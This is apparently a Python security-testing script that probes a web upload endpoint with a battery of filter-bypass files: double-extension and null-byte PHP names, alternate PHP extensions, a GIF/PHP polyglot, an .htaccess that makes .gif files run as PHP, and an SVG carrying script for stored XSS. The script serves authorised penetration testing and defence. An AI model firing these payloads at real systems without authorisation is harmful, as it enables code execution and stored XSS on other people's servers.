#!/usr/bin/env python
"""upload_probe.py — file-upload abuse probe (WSTG-BUSL-09), stdlib only.

The kit had no upload testing. This POSTs a battery of upload payloads to a file
field and uses a CONTROL to make the signal decisive (header_probe-style):

  control   a benign small GIF (benign.gif, image/gif)        -> should be ACCEPTED
  canary    a bare shell.php (application/x-httpd-php)         -> if ACCEPTED, NO filtering
                                                              (headline). If REJECTED, an
                                                              extension allowlist is present
                                                              -> the BYPASSES that then succeed
                                                              are the real leads.

Battery (a payload counts as a BYPASS lead only when bare .php was rejected,
i.e. it beat a real allowlist):
  - double-extension, both directions (shell.php.jpg, shell.jpg.php)
  - null byte (shell.php%00.jpg)                 [legacy PHP <5.3.4 path-trunc]
  - alternate PHP exts (.phtml, .phar, .php5, .pht, .shtml)
  - content-type mismatch (.php body served as image/jpeg)
  - polyglot GIF/PHP (GIF89a + <?php ?>, image/gif)   [fires only if re-parsed as PHP]
  - .htaccess (AddType application/x-httpd-php .gif -> .gif executes on Apache)
  - XSS-via-SVG (.svg with <script>)             [stored XSS if served inline]

HONEST CEILING (black-box): ACCEPTANCE != EXECUTION. Proving the uploaded script
FIRES is near-destructive (it runs code on the target) and is operator-gated on a
lab/sandbox. This tool proves ACCEPTANCE + (optionally) that the asset is SERVED
back at a retrievable path (parsed from the response or --confirm-base). Execution
itself is a manual, operator-gated confirmation. The one exception: an SVG served
as image/svg+xml IS a confirmed stored-XSS-via-upload primitive (renders in a
victim browser). Everything else stays a LEAD until execution is shown on-target.

ACTIVE / writes files -> requires mutation_testing: approved. Clean up uploaded
artifacts after testing (the operator deletes what landed on the target).

Usage:
  python upload_probe.py <upload-url> --field file [--method POST]
        [--header "Cookie: ..."] [--confirm-base <url-prefix>]
        [--data 'extra=form&fields'] [--insecure] [--timeout 20]
"""
import sys, os, re, ssl, json, time, argparse, urllib.request, urllib.parse, urllib.error
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
_CTX = ssl.create_default_context(); _CTX.check_hostname = False; _CTX.verify_mode = ssl.CERT_NONE

# Minimal valid 1x1 GIF89a — the benign control AND the polyglot base.
GIF = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00"
       b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
PHP = b"<?php echo 'REDAN-UPLOAD-EXEC'; ?>"
SVG = (b"<?xml version='1.0' standalone='no'?><svg xmlns='http://www.w3.org/2000/svg'>"
       b"<script>alert('redan-xss')</script></svg>")
HTACCESS = b"AddType application/x-httpd-php .gif\n"

# (id, filename, content-type, body, severity-if-bypass, class, detail)
BATTERY = [
    ("dbl_php_jpg",   "shell.php.jpg",   "image/jpeg",             PHP,       "high",   "double-extension (.php.jpg)",
     "Double-extension upload (.php.jpg)"),
    ("dbl_jpg_php",   "shell.jpg.php",   "image/jpeg",             PHP,       "high",   "double-extension (.jpg.php)",
     "Double-extension upload (.jpg.php)"),
    ("null_byte",     "shell.php%00.jpg","image/jpeg",             PHP,       "high",   "null-byte path truncation",
     "Null-byte upload (shell.php%00.jpg)"),
    ("ext_phtml",     "shell.phtml",     "application/x-httpd-php",PHP,      "high",   "alt PHP ext (.phtml)",
     "Alternate-extension upload (.phtml)"),
    ("ext_phar",      "shell.phar",      "application/octet-stream",PHP,      "medium", "alt PHP ext (.phar)",
     "Alternate-extension upload (.phar)"),
    ("ext_php5",      "shell.php5",      "application/x-httpd-php",PHP,      "medium", "alt PHP ext (.php5)",
     "Alternate-extension upload (.php5)"),
    ("ct_mismatch",   "shell.php",       "image/jpeg",             PHP,       "high",   "content-type mismatch (.php as image/jpeg)",
     "Content-type-mismatch upload (.php declared image/jpeg)"),
    ("poly_gif",      "shell.php.gif",   "image/gif",              GIF + PHP, "high",   "polyglot GIF/PHP (image/gif)",
     "Polyglot GIF/PHP upload (image/gif)"),
    ("htaccess",      ".htaccess",       "text/plain",             HTACCESS,  "high",   ".htaccess (redefine execution)",
     ".htaccess upload (AddType php .gif)"),
    ("svg_xss",       "xss.svg",         "image/svg+xml",          SVG,       "medium", "SVG stored-XSS",
     "SVG-with-<script> upload"),
]

# upload-path candidates echoed back in a successful upload response.
PATH_RE = re.compile(r'(?:https?://[^\s"\'<>]+)|/(?:uploads?|files|media|images?|img|assets|static|u/)[^\s"\'<>]+', re.I)
JSON_URL_RE = re.compile(r'"(?:url|path|file|location|src|href|name)"\s*:\s*"([^"]+)"', re.I)
REJECT_RE = re.compile(r'\b(invalid|not allowed|forbidden|denied|reject|unsupported|not permitted|extension|file type|upload failed|error)\b', re.I)


def _boundary():
    return "----redanboundary" + re.sub(r"[^0-9]", "", str(time.perf_counter_ns()))[-16:]


def _post_file(url, field, filename, ctype, body, method, headers, extra_data, timeout, verify):
    """multipart/form-data POST of one file (+ optional extra form fields)."""
    bnd = _boundary()
    parts = []
    if extra_data:
        for k, v in urllib.parse.parse_qsl(extra_data, keep_blank_values=True):
            parts.append((f"--{bnd}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n"
                          f"{v}\r\n").encode())
    parts.append((f"--{bnd}\r\nContent-Disposition: form-data; name=\"{field}\"; "
                  f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n").encode())
    parts.append(body + b"\r\n")
    parts.append(f"--{bnd}--\r\n".encode())
    data = b"".join(parts)
    h = {"User-Agent": UA, "Accept": "application/json,text/html;q=0.9,*/*;q=0.1",
         "Content-Type": f"multipart/form-data; boundary={bnd}"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=(_CTX if not verify else None)) as r:
            return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read(4000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, e.read(4000).decode("utf-8", "replace")
    except Exception as e:
        return None, {}, str(e)


def _accepted(status, body):
    if status is None:
        return False
    return 200 <= status < 300


def _paths(body):
    found = []
    for m in PATH_RE.findall(body or ""):
        if m not in found:
            found.append(m)
    for m in JSON_URL_RE.findall(body or ""):
        if m not in found:
            found.append(m)
    return found[:6]


def _fetch(url, verify, timeout):
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=timeout, context=(_CTX if not verify else None)) as r:
            return {"status": r.status, "content_type": r.headers.get("Content-Type", ""),
                    "len": len(r.read(2000))}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "content_type": (e.headers or {}).get("Content-Type", ""), "len": -1}
    except Exception as e:
        return {"status": None, "content_type": "", "len": -1, "error": str(e)[:120]}


def _resolve(path, upload_url, confirm_base):
    if path.startswith("http://") or path.startswith("https://"):
        return path
    if confirm_base is not None:
        return confirm_base.rstrip("/") + "/" + path.lstrip("/")
    return urllib.parse.urljoin(upload_url, path)


def run(url, field, method, headers, extra_data, confirm_base, timeout, verify):
    out = {"target": url, "field": field, "ok": True, "control": {}, "bare_php": {},
           "uploads": [], "findings": []}

    # --- control: benign GIF (should be accepted) ---
    sc, hc, bc = _post_file(url, field, "benign.gif", "image/gif", GIF, method, headers, extra_data, timeout, verify)
    control_ok = _accepted(sc, bc)
    out["control"] = {"filename": "benign.gif", "status": sc, "accepted": control_ok,
                      "reject_marker": bool(REJECT_RE.search(bc or ""))}

    # --- canary: bare shell.php (allowlist probe) ---
    sp, hp, bp = _post_file(url, field, "shell.php", "application/x-httpd-php", PHP, method, headers, extra_data, timeout, verify)
    bare_accepted = _accepted(sp, bp)
    out["bare_php"] = {"filename": "shell.php", "status": sp, "accepted": bare_accepted,
                       "reject_marker": bool(REJECT_RE.search(bp or ""))}

    findings = []

    if not control_ok:
        out["note"] = ("Benign control (benign.gif) was NOT accepted (status %s) — the endpoint may "
                       "require auth, a different --field, a different --method, or extra --data. The "
                       "battery results below are NOT meaningful until the control uploads cleanly."
                       % sc)

    if control_ok and bare_accepted:
        findings.append({"id": "upload-no-filtering", "severity": "high",
                         "detail": ("Bare shell.php was ACCEPTED with no extension filtering at all — "
                                    "direct upload-to-RCE surface. Execution is operator-gated on a "
                                    "lab/sandbox (acceptance != execution).")})

    for pid, fn, ct, body, sev, klass, detail in BATTERY:
        s, h, b = _post_file(url, field, fn, ct, body, method, headers, extra_data, timeout, verify)
        acc = _accepted(s, b)
        paths = _paths(b)
        entry = {"id": pid, "filename": fn, "content_type": ct, "class": klass,
                 "status": s, "accepted": acc, "reject_marker": bool(REJECT_RE.search(b or "")),
                 "body_snippet": (b or "")[:140].replace("\n", " "), "paths": paths}
        # optionally retrieve the uploaded asset to prove it's SERVED (not executed)
        if acc and paths:
            served = []
            for p in paths[:3]:
                served.append({**_fetch(_resolve(p, url, confirm_base), verify, timeout),
                               "url": _resolve(p, url, confirm_base)[:200]})
            entry["served"] = served
        out["uploads"].append(entry)

        if not acc:
            continue

        if pid == "svg_xss":
            svg_served = any("svg" in (x.get("content_type") or "").lower()
                             for x in entry.get("served", []))
            findings.append({
                "id": "upload-svg-xss",
                "severity": "medium" if svg_served else "low",
                "detail": ("SVG with <script> was uploaded" +
                           (" AND served back as image/svg+xml — confirmed stored-XSS-via-upload "
                            "primitive (renders in a victim browser)." if svg_served
                           else " — stored-XSS LEAD if served inline; confirm it renders in a VICTIM "
                                "context (serving URL not returned/retrievable here)."))})
        elif not bare_accepted:
            # real bypass: bare .php was rejected, this payload beat the allowlist
            findings.append({"id": "upload-bypass-" + pid, "severity": sev,
                             "detail": ("%s was ACCEPTED while bare .php was REJECTED — a real "
                                        "extension-allowlist bypass. Execution is operator-gated on a "
                                        "lab/sandbox (acceptance != execution)." % detail)})
        # if bare .php was already accepted, the upload-no-filtering headline covers it.

    out["findings"] = findings
    out.setdefault("note", out.get("note") or
                   ("ACTIVE upload probe -> requires mutation_testing: approved. ACCEPTANCE != EXECUTION: "
                    "all PHP/code leads stay LEADs until execution is shown on a lab/sandbox. Delete "
                    "uploaded artifacts after testing. Through a JS-challenge WAF these urllib probes "
                    "are BLIND (pitfalls.md) — re-test positives via the browser channel."))
    return out


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="File-upload abuse probe (WSTG-BUSL-09)")
    ap.add_argument("url", help="upload endpoint URL")
    ap.add_argument("--field", default="file", help="multipart form field name for the file")
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data", help="extra form fields, query-string encoded (k=v&k2=v2)")
    ap.add_argument("--header", action="append", default=[], help="extra header, 'Name: value'")
    ap.add_argument("--confirm-base", default=None,
                    help="URL prefix for retrieving uploaded assets (if the response doesn't echo a full URL)")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()
    headers = {}
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1); headers[k.strip()] = v.strip()
    print(json.dumps(run(a.url, a.field, a.method, headers, a.data, a.confirm_base, a.timeout, not a.insecure), indent=2))
